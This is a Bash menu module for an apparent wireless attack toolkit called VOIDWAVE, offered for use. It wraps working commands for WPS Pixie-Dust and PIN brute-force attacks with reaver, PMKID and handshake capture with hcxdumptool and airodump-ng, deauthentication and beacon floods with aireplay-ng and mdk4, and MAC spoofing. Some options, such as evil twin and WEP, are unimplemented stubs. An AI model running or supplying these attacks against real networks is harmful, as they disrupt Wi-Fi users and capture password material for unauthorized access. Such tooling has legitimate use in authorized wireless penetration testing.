#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
# VOIDWAVE Smart Wireless Menu
# ═══════════════════════════════════════════════════════════════════════════════
# Upgraded menu with:
# - Help system (? or H)
# - Pre-flight checks before attacks
# - Auto-scanning for targets
# - Smart target acquisition
# - Context-aware operation
# ═══════════════════════════════════════════════════════════════════════════════

[[ -n "${_VOIDWAVE_SMART_WIRELESS_LOADED:-}" ]] && return 0
declare -r _VOIDWAVE_SMART_WIRELESS_LOADED=1

# Source intelligence modules (same directory)
source "${BASH_SOURCE%/*}/help.sh" 2>/dev/null || true
source "${BASH_SOURCE%/*}/preflight.sh" 2>/dev/null || true
source "${BASH_SOURCE%/*}/targeting.sh" 2>/dev/null || true

# ═══════════════════════════════════════════════════════════════════════════════
# MENU DISPLAY
# ═══════════════════════════════════════════════════════════════════════════════

show_wireless_menu_smart() {
    # Root check
    if [[ $EUID -ne 0 ]]; then
        echo -e "    ${C_RED}Wireless attacks require root privileges${C_RESET}"
        echo "    Run: sudo voidwave"
        return 1
    fi

    while true; do
        clear_screen 2>/dev/null || clear
        _show_banner
        _show_status_bar
        _show_wireless_options
        
        local choice
        choice=$(_prompt_choice 62)
        
        # Handle help requests
        if handle_help_input "$choice" "wireless" 2>/dev/null; then
            continue
        fi
        
        # Handle menu choice
        _handle_wireless_choice "$choice"
        
        [[ "$choice" == "0" ]] && return 0
    done
}

_show_banner() {
    echo -e "${C_PURPLE}"
    cat << 'BANNER'
    ██╗   ██╗ ██████╗ ██╗██████╗     ██╗    ██╗ █████╗ ██╗   ██╗███████╗
    ██║   ██║██╔═══██╗██║██╔══██╗    ██║    ██║██╔══██╗██║   ██║██╔════╝
    ██║   ██║██║   ██║██║██║  ██║    ██║ █╗ ██║███████║██║   ██║█████╗
    ╚██╗ ██╔╝██║   ██║██║██║  ██║    ██║███╗██║██╔══██║╚██╗ ██╔╝██╔══╝
     ╚████╔╝ ╚██████╔╝██║██████╔╝    ╚███╔███╔╝██║  ██║ ╚████╔╝ ███████╗
      ╚═══╝   ╚═════╝ ╚═╝╚═════╝      ╚══╝╚══╝ ╚═╝  ╚═╝  ╚═══╝  ╚══════╝
BANNER
    echo -e "${C_RESET}"
    echo -e "    ${C_CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${C_RESET}"
    echo ""
}

_show_status_bar() {
    local root_status iface_status monitor_status target_status
    
    [[ $EUID -eq 0 ]] && root_status="${C_GREEN}Root${C_RESET}" || root_status="${C_RED}User${C_RESET}"
    [[ -n "${_CURRENT_IFACE:-}" ]] && iface_status="${C_CYAN}${_CURRENT_IFACE}${C_RESET}" || iface_status="${C_SHADOW}none${C_RESET}"
    [[ -n "${_MONITOR_IFACE:-}" ]] && monitor_status="${C_GREEN}${_MONITOR_IFACE}${C_RESET}" || monitor_status="${C_SHADOW}off${C_RESET}"
    
    if has_target 2>/dev/null; then
        target_status="${C_GREEN}$(get_target_string)${C_RESET}"
    else
        target_status="${C_SHADOW}none${C_RESET}"
    fi
    
    echo -e "    ${C_SHADOW}[${C_RESET}${root_status}${C_SHADOW}]${C_RESET} "\
"${C_SHADOW}Interface:${C_RESET} ${iface_status} "\
"${C_SHADOW}Monitor:${C_RESET} ${monitor_status} "\
"${C_SHADOW}Target:${C_RESET} ${target_status}"
    echo ""
}

_show_wireless_options() {
    echo -e "    ${C_BOLD}${C_PURPLE}◆ WIRELESS ATTACKS${C_RESET}"
    echo -e "    ${C_SHADOW}────────────────────────────────────────────────────────────${C_RESET}"
    
    echo -e "    ${C_CYAN}▸ Interface${C_RESET}"
    echo -e "      ${C_WHITE} 1${C_RESET}) Select Interface"
    echo -e "      ${C_WHITE} 2${C_RESET}) Monitor Mode ON"
    echo -e "      ${C_WHITE} 3${C_RESET}) Monitor Mode OFF"
    echo -e "      ${C_WHITE} 4${C_RESET}) MAC Spoof"
    
    echo ""
    echo -e "    ${C_CYAN}▸ Scanning${C_RESET}"
    echo -e "      ${C_WHITE} 5${C_RESET}) Scan Networks"
    echo -e "      ${C_WHITE} 6${C_RESET}) Scan WPS Networks"
    echo -e "      ${C_WHITE} 7${C_RESET}) Select Target"
    
    echo ""
    echo -e "    ${C_CYAN}▸ WPS Attacks${C_RESET}"
    echo -e "      ${C_WHITE}10${C_RESET}) Pixie-Dust"
    echo -e "      ${C_WHITE}11${C_RESET}) PIN Bruteforce"
    echo -e "      ${C_WHITE}12${C_RESET}) Known PINs"
    echo -e "      ${C_WHITE}13${C_RESET}) Algorithm PINs"
    
    echo ""
    echo -e "    ${C_CYAN}▸ WPA/WPA2${C_RESET}"
    echo -e "      ${C_WHITE}20${C_RESET}) PMKID Capture"
    echo -e "      ${C_WHITE}21${C_RESET}) Handshake Capture"
    echo -e "      ${C_WHITE}22${C_RESET}) Smart Capture"
    
    echo ""
    echo -e "    ${C_CYAN}▸ Evil Twin${C_RESET}"
    echo -e "      ${C_WHITE}30${C_RESET}) Full Attack"
    echo -e "      ${C_WHITE}31${C_RESET}) Open Honeypot"
    echo -e "      ${C_WHITE}32${C_RESET}) WPA Honeypot"
    
    echo ""
    echo -e "    ${C_CYAN}▸ DoS Attacks${C_RESET}"
    echo -e "      ${C_WHITE}40${C_RESET}) Deauth"
    echo -e "      ${C_WHITE}41${C_RESET}) Amok Mode"
    echo -e "      ${C_WHITE}42${C_RESET}) Beacon Flood"
    echo -e "      ${C_WHITE}43${C_RESET}) Pursuit Mode"
    
    echo ""
    echo -e "    ${C_CYAN}▸ Other${C_RESET}"
    echo -e "      ${C_WHITE}50${C_RESET}) WEP Attack"
    echo -e "      ${C_WHITE}51${C_RESET}) Enterprise"
    echo -e "      ${C_WHITE}60${C_RESET}) Hidden SSID"
    echo -e "      ${C_WHITE}61${C_RESET}) WPA3 Check"
    echo -e "      ${C_WHITE}62${C_RESET}) Wifite Auto"
    
    echo ""
    echo -e "    ${C_SHADOW}────────────────────────────────────────────────────────────${C_RESET}"
    echo -e "      ${C_WHITE} 0${C_RESET}) ${C_RED}Back${C_RESET}                ${C_SHADOW}?${C_RESET}) ${C_CYAN}Help & Descriptions${C_RESET}"
    echo ""
}

_prompt_choice() {
    local max="$1"
    echo -en "    ${C_PURPLE}▶${C_RESET} Select [0-${max}]: " >&2
    local choice
    read -r choice
    echo "${choice//[[:space:]]/}"
}

# ═══════════════════════════════════════════════════════════════════════════════
# CHOICE HANDLER
# ═══════════════════════════════════════════════════════════════════════════════

_handle_wireless_choice() {
    local choice="$1"
    
    case "$choice" in
        # Interface
        1) _do_select_interface ;;
        2) _do_enable_monitor ;;
        3) _do_disable_monitor ;;
        4) _do_mac_spoof ;;
        
        # Scanning
        5) _do_scan_networks ;;
        6) _do_scan_wps ;;
        7) _do_select_target ;;
        
        # WPS
        10) _do_wps_pixie ;;
        11) _do_wps_bruteforce ;;
        12) _do_wps_known ;;
        13) _do_wps_algorithm ;;
        
        # WPA
        20) _do_pmkid ;;
        21) _do_handshake ;;
        22) _do_smart_capture ;;
        
        # Evil Twin
        30) _do_eviltwin_full ;;
        31) _do_eviltwin_open ;;
        32) _do_eviltwin_wpa ;;
        
        # DoS
        40) _do_deauth ;;
        41) _do_amok ;;
        42) _do_beacon_flood ;;
        43) _do_pursuit ;;
        
        # Other
        50) _do_wep ;;
        51) _do_enterprise ;;
        60) _do_hidden_ssid ;;
        61) _do_wpa3_check ;;
        62) _do_wifite ;;
        
        0) return 0 ;;
        "") return ;;
        *) echo -e "    ${C_RED}Invalid option${C_RESET}"; sleep 1 ;;
    esac
    
    [[ "$choice" != "0" && "$choice" != "" ]] && _wait_for_key
}

_wait_for_key() {
    echo ""
    echo -e "    ${C_SHADOW}Press Enter to continue...${C_RESET}"
    read -r
}

# ═══════════════════════════════════════════════════════════════════════════════
# INTERFACE OPERATIONS
# ═══════════════════════════════════════════════════════════════════════════════

_do_select_interface() {
    local -a ifaces=()
    while IFS= read -r iface; do
        [[ -n "$iface" ]] && ifaces+=("$iface")
    done < <(iw dev 2>/dev/null | awk '/Interface/{print $2}')
    
    if [[ ${#ifaces[@]} -eq 0 ]]; then
        echo -e "    ${C_RED}No wireless interfaces found${C_RESET}"
        return 1
    fi
    
    echo ""
    echo -e "    ${C_CYAN}━━━ SELECT INTERFACE ━━━${C_RESET}"
    echo ""
    
    local i=1
    for iface in "${ifaces[@]}"; do
        local mode driver
        mode=$(iw dev "$iface" info 2>/dev/null | awk '/type/{print $2}')
        driver=$(ethtool -i "$iface" 2>/dev/null | awk '/driver/{print $2}')
        echo -e "    ${C_CYAN}[$i]${C_RESET} $iface ${C_SHADOW}($mode${driver:+, $driver})${C_RESET}"
        ((i++))
    done
    echo ""
    
    echo -en "    Select [1-${#ifaces[@]}]: "
    read -r choice
    
    if [[ "$choice" =~ ^[0-9]+$ ]] && [[ "$choice" -ge 1 ]] && [[ "$choice" -le "${#ifaces[@]}" ]]; then
        _CURRENT_IFACE="${ifaces[$((choice-1))]}"
        echo -e "    ${C_GREEN}✓ Selected: $_CURRENT_IFACE${C_RESET}"
    fi
}

_do_enable_monitor() {
    # Auto-select if needed
    if [[ -z "${_CURRENT_IFACE:-}" ]]; then
        _do_select_interface || return 1
    fi
    
    echo ""
    echo -e "    ${C_CYAN}⟳ Enabling monitor mode on $_CURRENT_IFACE...${C_RESET}"
    
    airmon-ng check kill &>/dev/null
    
    if airmon-ng start "$_CURRENT_IFACE" 2>&1 | sed 's/^/    /'; then
        sleep 1
        _MONITOR_IFACE=$(ls /sys/class/net/ 2>/dev/null | grep -E "${_CURRENT_IFACE}mon|mon[0-9]" | head -1)
        [[ -z "$_MONITOR_IFACE" ]] && _MONITOR_IFACE="${_CURRENT_IFACE}"
        
        if iw dev "$_MONITOR_IFACE" info 2>/dev/null | grep -q "type monitor"; then
            echo -e "    ${C_GREEN}✓ Monitor mode: $_MONITOR_IFACE${C_RESET}"
        else
            echo -e "    ${C_RED}✗ Failed to verify monitor mode${C_RESET}"
        fi
    fi
}

_do_disable_monitor() {
    local iface="${_MONITOR_IFACE:-}"
    [[ -z "$iface" ]] && { echo -e "    ${C_YELLOW}Monitor mode not active${C_RESET}"; return; }
    
    echo -e "    ${C_CYAN}⟳ Disabling monitor mode...${C_RESET}"
    airmon-ng stop "$iface" &>/dev/null
    systemctl restart NetworkManager &>/dev/null || true
    _MONITOR_IFACE=""
    echo -e "    ${C_GREEN}✓ Monitor mode disabled${C_RESET}"
}

_do_mac_spoof() {
    ensure_interface || return 1
    
    echo ""
    echo -e "    ${C_CYAN}━━━ MAC SPOOFING ━━━${C_RESET}"
    echo ""
    echo "    1) Random MAC"
    echo "    2) Specific MAC"
    echo "    3) Vendor spoof"
    echo "    4) Restore original"
    echo "    0) Cancel"
    echo ""
    
    read -rp "    Select: " opt
    
    local iface="${_MONITOR_IFACE:-$_CURRENT_IFACE}"
    ip link set "$iface" down 2>/dev/null
    
    case "$opt" in
        1) macchanger -r "$iface" 2>&1 | sed 's/^/    /' ;;
        2) read -rp "    MAC: " mac; macchanger -m "$mac" "$iface" 2>&1 | sed 's/^/    /' ;;
        3) macchanger -a "$iface" 2>&1 | sed 's/^/    /' ;;
        4) macchanger -p "$iface" 2>&1 | sed 's/^/    /' ;;
    esac
    
    ip link set "$iface" up 2>/dev/null
}

# ═══════════════════════════════════════════════════════════════════════════════
# SCANNING OPERATIONS
# ═══════════════════════════════════════════════════════════════════════════════

_do_scan_networks() {
    ensure_interface || return 1
    local iface="${_MONITOR_IFACE:-$_CURRENT_IFACE}"
    
    echo ""
    read -rp "    Scan duration [20]: " duration
    duration="${duration:-20}"
    
    scan_networks "$iface" "$duration"
}

_do_scan_wps() {
    ensure_monitor || return 1
    
    echo ""
    read -rp "    Scan duration [30]: " duration
    duration="${duration:-30}"
    
    scan_wps "$_MONITOR_IFACE" "$duration"
}

_do_select_target() {
    if [[ ${#SCAN_RESULTS[@]} -eq 0 ]]; then
        echo -e "    ${C_YELLOW}No scan results. Running quick scan...${C_RESET}"
        ensure_interface || return 1
        scan_networks "${_MONITOR_IFACE:-$_CURRENT_IFACE}" 15
    fi
    
    select_target
}

# ═══════════════════════════════════════════════════════════════════════════════
# WPS ATTACKS
# ═══════════════════════════════════════════════════════════════════════════════

_do_wps_pixie() {
    # Pre-flight
    preflight "wps_pixie" || return 1
    
    # Need target - auto-scan WPS if none
    if ! has_target || [[ ${#SCAN_WPS[@]} -eq 0 ]]; then
        echo -e "    ${C_CYAN}Scanning for WPS networks...${C_RESET}"
        scan_wps "$_MONITOR_IFACE" 20
        select_wps_target || return 1
    fi
    
    echo ""
    echo -e "    ${C_CYAN}━━━ PIXIE-DUST ATTACK ━━━${C_RESET}"
    echo -e "    ${C_WHITE}Target:${C_RESET} $TARGET_ESSID ($TARGET_BSSID)"
    echo -e "    ${C_WHITE}Channel:${C_RESET} $TARGET_CHANNEL"
    echo ""
    
    confirm "    Start attack?" || return 0
    
    echo ""
    echo -e "    ${C_CYAN}⟳ Running Pixie-Dust...${C_RESET}"
    echo ""
    
    reaver -i "$_MONITOR_IFACE" -b "$TARGET_BSSID" -c "$TARGET_CHANNEL" -K 1 -vvv 2>&1 | sed 's/^/    /'
}

_do_wps_bruteforce() {
    preflight "wps_bruteforce" || return 1
    
    if ! has_target; then
        scan_wps "$_MONITOR_IFACE" 20
        select_wps_target || return 1
    fi
    
    echo ""
    echo -e "    ${C_CYAN}━━━ WPS BRUTEFORCE ━━━${C_RESET}"
    echo -e "    ${C_WHITE}Target:${C_RESET} $TARGET_ESSID ($TARGET_BSSID)"
    echo -e "    ${C_YELLOW}WARNING: This can take 4-10 hours${C_RESET}"
    echo ""
    
    confirm "    Start attack?" || return 0
    
    reaver -i "$_MONITOR_IFACE" -b "$TARGET_BSSID" -c "$TARGET_CHANNEL" -vvv 2>&1 | sed 's/^/    /'
}

_do_wps_known() {
    preflight "wps_known" || return 1
    
    if ! has_target; then
        scan_wps "$_MONITOR_IFACE" 20
        select_wps_target || return 1
    fi
    
    echo ""
    echo -e "    ${C_CYAN}━━━ KNOWN PINS ATTACK ━━━${C_RESET}"
    echo -e "    ${C_SHADOW}Trying manufacturer default PINs...${C_RESET}"
    echo ""
    
    # TODO: Implement known PIN database lookup
    echo -e "    ${C_YELLOW}Known PINs database not yet implemented${C_RESET}"
}

_do_wps_algorithm() {
    preflight "wps_algorithm" || return 1
    
    if ! has_target; then
        scan_wps "$_MONITOR_IFACE" 20
        select_wps_target || return 1
    fi
    
    echo ""
    echo -e "    ${C_CYAN}━━━ ALGORITHM PIN ATTACK ━━━${C_RESET}"
    echo -e "    ${C_SHADOW}Calculating PINs from BSSID...${C_RESET}"
    echo ""
    
    # TODO: Implement PIN algorithms
    echo -e "    ${C_YELLOW}PIN algorithms not yet implemented${C_RESET}"
}

# ═══════════════════════════════════════════════════════════════════════════════
# WPA ATTACKS
# ═══════════════════════════════════════════════════════════════════════════════

_do_pmkid() {
    preflight "pmkid" || return 1
    
    if ! has_target; then
        scan_networks "$_MONITOR_IFACE" 15
        select_target || return 1
    fi
    
    echo ""
    echo -e "    ${C_CYAN}━━━ PMKID CAPTURE ━━━${C_RESET}"
    echo -e "    ${C_WHITE}Target:${C_RESET} $TARGET_ESSID ($TARGET_BSSID)"
    echo ""
    
    local outfile="${VOIDWAVE_OUTPUT:-$HOME/.voidwave/output}/pmkid_${TARGET_BSSID//:/}_$(date +%Y%m%d_%H%M%S).pcapng"
    mkdir -p "$(dirname "$outfile")"
    
    echo -e "    ${C_CYAN}⟳ Capturing PMKID (30s timeout)...${C_RESET}"
    echo ""
    
    timeout 30 hcxdumptool -i "$_MONITOR_IFACE" \
        --filterlist_ap="$TARGET_BSSID" \
        --filtermode=2 \
        -o "$outfile" 2>&1 | sed 's/^/    /' || true
    
    if [[ -f "$outfile" ]]; then
        echo -e "    ${C_GREEN}✓ Capture saved: $outfile${C_RESET}"
    fi
}

_do_handshake() {
    preflight "handshake" || return 1
    
    if ! has_target; then
        scan_networks "$_MONITOR_IFACE" 15
        select_target || return 1
    fi
    
    # Check for clients
    select_client
    
    echo ""
    echo -e "    ${C_CYAN}━━━ HANDSHAKE CAPTURE ━━━${C_RESET}"
    echo -e "    ${C_WHITE}Target:${C_RESET} $TARGET_ESSID ($TARGET_BSSID)"
    [[ -n "$TARGET_CLIENT" ]] && echo -e "    ${C_WHITE}Client:${C_RESET} $TARGET_CLIENT"
    echo ""
    
    local outfile="${VOIDWAVE_OUTPUT:-$HOME/.voidwave/output}/handshake_${TARGET_BSSID//:/}_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$(dirname "$outfile")"
    
    echo -e "    ${C_CYAN}⟳ Starting capture...${C_RESET}"
    
    # Start capture in background
    airodump-ng --bssid "$TARGET_BSSID" -c "$TARGET_CHANNEL" -w "$outfile" "$_MONITOR_IFACE" &>/dev/null &
    local dump_pid=$!
    
    sleep 3
    
    # Send deauth
    echo -e "    ${C_CYAN}⟳ Sending deauth...${C_RESET}"
    if [[ -n "$TARGET_CLIENT" ]]; then
        aireplay-ng -0 10 -a "$TARGET_BSSID" -c "$TARGET_CLIENT" "$_MONITOR_IFACE" &>/dev/null
    else
        aireplay-ng -0 10 -a "$TARGET_BSSID" "$_MONITOR_IFACE" &>/dev/null
    fi
    
    echo -e "    ${C_SHADOW}Waiting for handshake (30s)...${C_RESET}"
    sleep 30
    
    kill $dump_pid 2>/dev/null
    
    if [[ -f "${outfile}-01.cap" ]]; then
        echo -e "    ${C_GREEN}✓ Capture saved: ${outfile}-01.cap${C_RESET}"
    fi
}

_do_smart_capture() {
    # Same as handshake but with auto-validation
    _do_handshake
}

# ═══════════════════════════════════════════════════════════════════════════════
# EVIL TWIN (STUBS)
# ═══════════════════════════════════════════════════════════════════════════════

_do_eviltwin_full() {
    preflight "eviltwin_full" || return 1
    echo -e "    ${C_YELLOW}Evil Twin full attack - not yet implemented${C_RESET}"
}

_do_eviltwin_open() {
    preflight "eviltwin" || return 1
    echo -e "    ${C_YELLOW}Evil Twin open honeypot - not yet implemented${C_RESET}"
}

_do_eviltwin_wpa() {
    preflight "eviltwin" || return 1
    echo -e "    ${C_YELLOW}Evil Twin WPA honeypot - not yet implemented${C_RESET}"
}

# ═══════════════════════════════════════════════════════════════════════════════
# DoS ATTACKS
# ═══════════════════════════════════════════════════════════════════════════════

_do_deauth() {
    preflight "deauth" || return 1
    
    if ! has_target; then
        scan_networks "$_MONITOR_IFACE" 15
        select_target || return 1
    fi
    
    select_client
    
    echo ""
    echo -e "    ${C_RED}━━━ DEAUTHENTICATION ATTACK ━━━${C_RESET}"
    echo -e "    ${C_WHITE}Target AP:${C_RESET} $TARGET_BSSID"
    [[ -n "$TARGET_CLIENT" ]] && echo -e "    ${C_WHITE}Client:${C_RESET} $TARGET_CLIENT" || echo -e "    ${C_WHITE}Mode:${C_RESET} Broadcast"
    echo ""
    
    read -rp "    Packet count [0=continuous]: " count
    count="${count:-0}"
    
    confirm "    Start attack?" || return 0
    
    echo ""
    echo -e "    ${C_RED}⟳ Sending deauth packets...${C_RESET}"
    
    if [[ -n "$TARGET_CLIENT" ]]; then
        aireplay-ng -0 "$count" -a "$TARGET_BSSID" -c "$TARGET_CLIENT" "$_MONITOR_IFACE" 2>&1 | sed 's/^/    /'
    else
        aireplay-ng -0 "$count" -a "$TARGET_BSSID" "$_MONITOR_IFACE" 2>&1 | sed 's/^/    /'
    fi
}

_do_amok() {
    preflight "amok" || return 1
    echo -e "    ${C_YELLOW}Amok mode - requires mdk4${C_RESET}"
    mdk4 "$_MONITOR_IFACE" d 2>&1 | sed 's/^/    /' || true
}

_do_beacon_flood() {
    preflight "beacon_flood" || return 1
    echo -e "    ${C_YELLOW}Beacon flood - requires mdk4${C_RESET}"
    mdk4 "$_MONITOR_IFACE" b 2>&1 | sed 's/^/    /' || true
}

_do_pursuit() {
    preflight "amok" || return 1
    echo -e "    ${C_YELLOW}Pursuit mode - not yet implemented${C_RESET}"
}

# ═══════════════════════════════════════════════════════════════════════════════
# OTHER ATTACKS (STUBS)
# ═══════════════════════════════════════════════════════════════════════════════

_do_wep() {
    preflight "wep" || return 1
    echo -e "    ${C_YELLOW}WEP attack suite - not yet implemented${C_RESET}"
}

_do_enterprise() {
    preflight "enterprise" || return 1
    echo -e "    ${C_YELLOW}Enterprise attack - not yet implemented${C_RESET}"
}

_do_hidden_ssid() {
    ensure_monitor || return 1
    echo -e "    ${C_YELLOW}Hidden SSID reveal - not yet implemented${C_RESET}"
}

_do_wpa3_check() {
    ensure_monitor || return 1
    echo -e "    ${C_YELLOW}WPA3 downgrade check - not yet implemented${C_RESET}"
}

_do_wifite() {
    if ! command -v wifite &>/dev/null; then
        echo -e "    ${C_RED}wifite not found - apt install wifite${C_RESET}"
        return 1
    fi
    
    echo -e "    ${C_CYAN}Launching wifite...${C_RESET}"
    wifite 2>&1
}

# ═══════════════════════════════════════════════════════════════════════════════
# UTILITY FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════

confirm() {
    local prompt="${1:-Continue?}"
    echo -en "${prompt} [y/N]: "
    local answer
    read -r answer
    [[ "${answer,,}" == "y" || "${answer,,}" == "yes" ]]
}

clear_screen() {
    printf '\033[2J\033[H'
}

# Color definitions (if not already set)
: "${C_RESET:=\033[0m}"
: "${C_BOLD:=\033[1m}"
: "${C_RED:=\033[0;31m}"
: "${C_GREEN:=\033[0;32m}"
: "${C_YELLOW:=\033[0;33m}"
: "${C_CYAN:=\033[0;36m}"
: "${C_PURPLE:=\033[0;35m}"
: "${C_WHITE:=\033[1;37m}"
: "${C_SHADOW:=\033[0;90m}"

# ═══════════════════════════════════════════════════════════════════════════════
# EXPORTS
# ═══════════════════════════════════════════════════════════════════════════════

export -f show_wireless_menu_smart
